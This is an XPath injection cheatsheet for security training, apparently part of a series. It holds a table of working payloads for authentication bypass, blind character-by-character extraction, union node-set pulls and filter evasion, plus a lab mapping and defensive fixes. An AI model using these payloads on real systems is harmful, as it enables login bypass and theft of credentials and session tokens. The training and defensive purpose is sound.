# XPath Injection — Cheatsheet and Lab Mapping

## 1. Quick-Reference Payload Cheatsheet

All payloads explained in full in files 2 and 4 — this is a compressed lookup table, not a
replacement for understanding the mechanism.

| Goal | Payload | Mechanism (one line) |
|---|---|---|
| Detect injection | `'` or `"` | Triggers raw parser exception if unescaped |
| Auth bypass (any user) | `' or '1'='1` | Tautology widens predicate to match all nodes |
| Auth bypass (specific user) | `admin' or '1'='1` | Closes literal at target username, then tautology |
| Confirm element name | `' or name()='username' or 'x'='y` | `name()` returns current node's tag name |
| Count root children | `' or count(/*)=N or 'a'='b` | `count()` + wildcard axis, iterate N |
| Count specific nodes | `' or count(//user)=N or 'a'='b` | `//` descendant-or-self axis shorthand |
| String length | `' or string-length(//user[1]/password/text())=N or 'a'='b` | Bounds the extraction loop |
| Extract char (XPath 1.0) | `' or substring(X,1,1)='a' or 'x'='y` | 1-indexed substring, literal compare |
| Extract char (XPath 2.0, binary search) | `' or string-to-codepoints(substring(X,1,1))=97 or 'x'='y` | Code-point compare enables binary search |
| Extract attribute | `' or //user[1]/@sessionToken='x' or '1'='1` | `@` = attribute axis, not child element |
| Pull unrelated node-set | `x'] | //user/*[contains(name(),'p` | `|` union operator, no column-count constraint |
| Bypass quote filter | `" or "1"="1` | Switch quote style entirely |
| Bypass quote+literal filter | `concat('ad','min')` | Reassemble target string from fragments |
| Bypass and/or keyword filter | `x'] | //user[1]/*[name()!='x` | Union + `!=`, no boolean keyword needed |
| Bypass bracket filter | `' or /*/*/*/text()='admin` | Wildcard traversal without `[ ]` |

## 2. PortSwigger Web Security Academy — Honest Lab Mapping

This is the section where this series deliberately does **not** force a clean mapping that doesn't
exist, matching how the SQL Injection series in this library handled honest gaps.

### What Academy actually has

PortSwigger Web Security Academy has **no dedicated server-side XPath injection topic** — there is
no "XPath injection" entry in the main injection learning path the way there is for SQL injection,
OS command injection, NoSQL injection, or LDAP injection. There are no labs covering:

- Authentication bypass via server-side XPath injection
- Blind boolean-based extraction against a server-side XPath query
- Data extraction via union/node-set manipulation against a server-side XPath query

All of the manual techniques in files 2 and 4 of this series — which are the textbook, real-world
form of XPath injection — currently have **zero matching Academy labs**.

### What Academy does have, and why it's a different vulnerability

Academy's only XPath-related content lives under **client-side / DOM-based vulnerabilities**, not
under the injection category:

| Topic | What it actually tests |
|---|---|
| Client-side XPath injection (DOM-based) | Background reading on the vulnerability class |
| Lab: DOM-based XPath injection (reflected) | A URL parameter flows into a client-side `document.evaluate()` call, letting an attacker manipulate which DOM node a script reads from, affecting page behavior |
| Lab: DOM-based XPath injection (stored) | Same sink, but the attacker-controlled value is first stored (e.g., in a comment) and later read back into the same client-side `document.evaluate()` call |

This is a genuinely different bug class from everything in files 2 and 4:

- **Sink:** `document.evaluate()` / `element.evaluate()` running in the victim's browser, not a
  server-side XPath query builder.
- **Impact:** typically closer to DOM XSS / client-side logic manipulation — affecting what the
  *victim's own browser* renders or does — rather than the server-side authentication bypass or
  bulk data extraction covered in files 2–4 of this series.
- **Technique overlap:** the underlying XPath syntax knowledge (axes, predicates, `name()`,
  `contains()`) is the same, so working through these two labs is still useful for building XPath
  syntax fluency, but the *exploitation scenario* does not exercise auth bypass or blind boolean
  extraction at all.

**Recommended order if practicing both Academy labs (correct Academy difficulty progression):**

1. Read: *Client-side XPath injection (DOM-based)* — background page, Apprentice-tier reading
2. Lab: *DOM-based XPath injection (reflected)* — Apprentice difficulty
3. Lab: *DOM-based XPath injection (stored)* — Practitioner difficulty (stored variant is
   consistently the harder/later lab across every Academy DOM-based vulnerability category, since
   it requires an extra step of getting the payload persisted before triggering it)

### Where to actually practice the server-side techniques in this series

Since Academy doesn't cover this, the standard industry-referenced alternative (cited directly in
NetSPI's technical write-up on XPath injection and used as the reference target by multiple
public exploitation walkthroughs) is:

```bash
git clone https://github.com/NetSPI/XPath-Injection-Lab.git
cd XPath-Injection-Lab
docker build -t bookapp .
docker run -p 8888:80 bookapp
```

This spins up a deliberately vulnerable "book finder" app with a server-side XPath query built via
string concatenation — the exact `//book[title/text()='...']`-style construction used throughout
files 2 and 4 of this series. Point Burp Suite or `xcat` (file 3) directly at it once running.

Secondary references worth keeping bookmarked for additional practice targets and payload
cross-checking:

- OWASP's XPath Injection community page — canonical explanation of the vulnerability class and
  mitigation guidance (parameterized XPath, custom error pages)
- PayloadsAllTheThings' XPATH Injection page — actively maintained payload list, useful for
  cross-checking edge-case syntax across different XPath engine implementations

## 3. Defensive Summary (for completeness in reports)

- **Primary fix:** use parameterized/bound XPath queries (`javax.xml.xpath` with
  `XPathVariableResolver`, .NET `XPathExpression` with bound variables) instead of string
  concatenation — structurally identical advice to "use prepared statements" for SQL injection.
- **Defense in depth:** strict allow-list input validation — reject anything outside expected
  alphanumeric input rather than trying to blocklist specific XPath metacharacters, since file 4
  of this series demonstrates how unreliable blocklist-based filtering is against this class.
- **Reduce blast radius:** since XPath has no internal access-control boundary (file 1, section 3),
  segregating sensitive data (credentials, tokens) into a properly access-controlled datastore
  rather than the same XML document queried by lower-privilege features is a structural mitigation
  worth calling out in any report where XPath injection is found in a non-auth feature that happens
  to share a document with sensitive data.
